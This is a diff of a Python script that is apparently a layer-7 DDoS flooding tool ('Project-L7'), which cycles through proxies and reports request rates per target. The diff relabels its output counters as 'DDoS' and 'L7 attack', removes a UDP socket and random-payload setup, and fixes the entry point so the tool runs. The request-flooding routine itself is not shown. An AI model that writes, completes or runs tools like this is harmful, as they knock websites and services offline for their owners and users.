@@ -1,27 +1,17 @@
 # -*- coding: utf-8 -*-
 #!/usr/bin/python3
-import sys
-import os
-import time
-import socket
-import random
 import requests
+import socket
 import socks
+import time
+import random
 import threading
+import sys
 import ssl
 import datetime
-#Code Time
-from datetime import datetime
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
-##############
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
-#############                                     
+
+
+
 print('''
 
    ▄███████▄    ▄████████    ▄████████    ▄███████▄    ▄████████    ▄████████    ▄████████ ███▄▄▄▄   ████████▄   ▄██████▄          ▄████████  ▄█               ▄████████     ███        ▄████████ ████████▄   ███    █▄     ▄████████      
@@ -292,7 +282,7 @@ def OutputToScreen(ind_rlock):
 | |    / /\  \ \_/ | |_  | |_)      / / 
 |_|__ /_/--\  |_|  |_|__ |_| \     /_/  
    '''))
-		#1. xxx.xxx.xxx.xxx:xxxxx ==> Rps: xxxx
+		#1. xxx.xxx.xxx.xxx:xxxxx ==> DDoS: xxxx
 		ind_rlock.acquire()
 		top10 = sorted(ind_dict, key=ind_dict.get, reverse=True)
 		for num in range(10):
@@ -302,13 +292,13 @@ def OutputToScreen(ind_rlock):
 				top = top10[num]
 				rps = ind_dict[top]
 				ind_dict[top] = 0
-			print("{:^70}".format("{:2d}. {:^22s} | Rps: {:d}".format(num+1,top,rps)))
+			print("{:^70}".format("{:2d}. {:^22s} | DDoS: {:d}".format(num+1,top,rps)))
 		total = 0
 		for k,v in ind_dict.items():
 			total = total + v
 			ind_dict[k] = 0
 		ind_rlock.release()
-		print("{:^70}".format(" ["+sp_char[i]+"] CC attack | Total Rps:"+str(total)))
+		print("{:^70}".format(" ["+sp_char[i]+"]L7 attack | Total DDoS:"+str(total)))
 		i+=1
 		time.sleep(1)
 		print("\n"*100)
@@ -722,5 +712,6 @@ def main():
 		except KeyboardInterrupt:
 			break
 	
-if __name__ == '__Project-L7__':
-  Project-L7()
+
+if __name__ == "__main__":
+	main()
